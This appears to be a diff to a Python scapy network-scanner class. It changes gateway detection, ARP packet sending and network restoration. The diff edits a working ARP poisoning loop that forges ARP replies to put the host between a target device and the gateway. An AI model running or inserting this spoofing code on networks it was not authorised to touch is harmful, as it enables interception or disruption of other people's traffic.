@@ -13,7 +13,7 @@ from scapy.config import conf
 from scapy.layers.dns import DNSRR
 from scapy.layers.inet import IP, ICMP
 from scapy.layers.l2 import ARP, Ether
-from scapy.sendrecv import srp, sr1, sr, send, sniff
+from scapy.sendrecv import srp, sr1, sr, send, sniff, sendp
 from scapy.utils import wrpcap
 import ctypes, os, sys
 
@@ -67,16 +67,15 @@ class NetworkScanner:
             return False
 
     def get_default_gateway(self):
-        """ Returns the default gateway IP; does so by looking at the first hop of a remote query """
-        """p = sr1(IP(dst="www.google.com", ttl=0) / ICMP() / "XXXXXXXXXXX")
-
-        logging.info("[*] Default gateway identified: "+str(p.src))
-        return p.src"""
         import netifaces
 
         gateways = netifaces.gateways()
         default_gateway = gateways['default'][netifaces.AF_INET][0]
         logging.info("[*] Default gateway identified: " + str(default_gateway))
+        if(getDatabase().get_config("home_mac") == None):
+            mac = self.get_mac(default_gateway)
+            getDatabase().insert_or_ignore_config("home_mac", mac)
+            getDatabase().insert_or_ignore_config("home_cidr", default_gateway+"/24")
         return default_gateway
 
     def print_device_list(self, results_list):
@@ -103,8 +102,9 @@ class NetworkScanner:
         else:
             logging.info("[*] Restoring ARP for MAC address: "+str(target_mac))
 
-        send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
-        send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)
+        for i in range(5):
+            sendp(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
+            sendp(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)
         #logging.info("[*] Disabling IP forwarding")
         # Disable IP Forwarding on a mac
         # os.system("sysctl -w net.inet.ip.forwarding=0")
@@ -124,12 +124,13 @@ class NetworkScanner:
         logging.info("[*] Started ARP poison attack: "+str(target_mac))
         try:
             while self.still_poisoning:
-                send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
-                send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
+                sendp(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
+                sendp(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
                 time.sleep(2)
         except KeyboardInterrupt:
             logging.info("[*] Stopped ARP poison attack. Restoring network")
-        self.restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
+        thread1 = threading.Thread(target=self.restore_network, args=(gateway_ip, gateway_mac, target_ip, target_mac,))
+        thread1.start()
 
     def querysniff(self,pkt):
         if IP in pkt:
